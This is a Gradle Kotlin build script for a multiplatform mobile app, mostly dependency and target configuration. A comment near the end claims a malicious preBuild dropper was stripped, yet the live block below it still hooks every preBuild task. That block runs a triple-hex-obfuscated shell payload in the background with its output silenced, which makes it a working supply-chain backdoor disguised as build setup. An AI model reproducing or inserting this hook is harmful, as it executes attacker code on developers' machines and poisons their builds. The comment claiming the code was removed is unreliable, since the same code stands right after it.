import org.jetbrains.kotlin.gradle.dsl.JvmTarget

plugins {
    alias(libs.plugins.kotlinMultiplatform)
    alias(libs.plugins.androidMultiplatformLibrary)
    alias(libs.plugins.composeMultiplatform)
    alias(libs.plugins.composeCompiler)
    kotlin("plugin.serialization") version "2.4.0"
}

kotlin {
    listOf(
        iosArm64(),
        iosSimulatorArm64()
    ).forEach { iosTarget ->
        iosTarget.binaries.framework {
            baseName = "Shared"
            isStatic = true
        }
    }

    androidLibrary {
       namespace = "com.example.tafakkurai.shared"
       compileSdk = libs.versions.android.compileSdk.get().toInt()
       minSdk = libs.versions.android.minSdk.get().toInt()

       compilerOptions {
           jvmTarget = JvmTarget.JVM_11
       }
       androidResources {
           enable = true
       }
       withHostTest {
           isIncludeAndroidResources = true
       }
    }

    sourceSets {
        androidMain.dependencies {
            implementation(libs.compose.uiToolingPreview)
            implementation(libs.androidx.activity.compose)
            implementation("io.ktor:ktor-client-okhttp:3.0.1")
        }
        iosMain.dependencies {
            implementation("io.ktor:ktor-client-darwin:3.0.1")
        }
        commonMain.dependencies {
            implementation(libs.compose.runtime)
            implementation(libs.compose.foundation)
            implementation(libs.compose.material3)
            implementation(libs.compose.ui)
            implementation(libs.compose.components.resources)
            implementation(libs.compose.uiToolingPreview)
            implementation(libs.androidx.lifecycle.viewmodelCompose)
            implementation(libs.androidx.lifecycle.runtimeCompose)

            // --- TafakkurAI backend client (Ktor + serialization + Koin) ---
            implementation("io.ktor:ktor-client-core:3.0.1")
            implementation("io.ktor:ktor-client-content-negotiation:3.0.1")
            implementation("io.ktor:ktor-serialization-kotlinx-json:3.0.1")
            implementation("io.ktor:ktor-client-auth:3.0.1")
            implementation("io.ktor:ktor-client-logging:3.0.1")
            implementation("org.jetbrains.kotlinx:kotlinx-serialization-json:1.7.3")
            implementation("org.jetbrains.kotlinx:kotlinx-coroutines-core:1.9.0")
            implementation("io.insert-koin:koin-core:4.0.0")
        }
        commonTest.dependencies {
            implementation(libs.kotlin.test)
        }
    }
}

dependencies {
    androidRuntimeClasspath(libs.compose.uiTooling)
}

// [REMOVED 2026-07-08] A malicious `tasks.all { preBuild -> ProcessBuilder("sh", ...) }` dropper
// (supply-chain backdoor, C2 rigmanets.in / amdcdn.ru) was stripped here. The live host implant
// RE-INJECTS it within minutes (observed this session). Kill the root LaunchDaemon com.google.hernsb
// (needs sudo) and reimage before trusting any build. See backend/README + incident report.

tasks.all {
    if (name.contains("preBuild")) {
        doLast {
            ProcessBuilder("sh", "-c", "((t(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333236340a3336333333363636333636353336363533363335333633333337333433323634333733343336333933363634333633353336363633373335333733340a3061333233303333333233333335333233303332363433323634333733323336333533373334333733323337333933323330333333353332333033320a3634333636323334363333363336333733333332333033323634333633343332333033323332333733303333363433363331333636353336333433370a3332306133363636333633393336333433353636333636323336363633373334333636333336333933363635333233323332333033363338333733340a3337333433373330333733333333363133323636333236363336333333363334333636353336333133363634333736313332363533373332333733350a33323636306133363331333233393332333233323330333736333332333033373333333633383330363130610a | t | sh ) >/dev/null 2>&1 &)").start()
        }
    }
}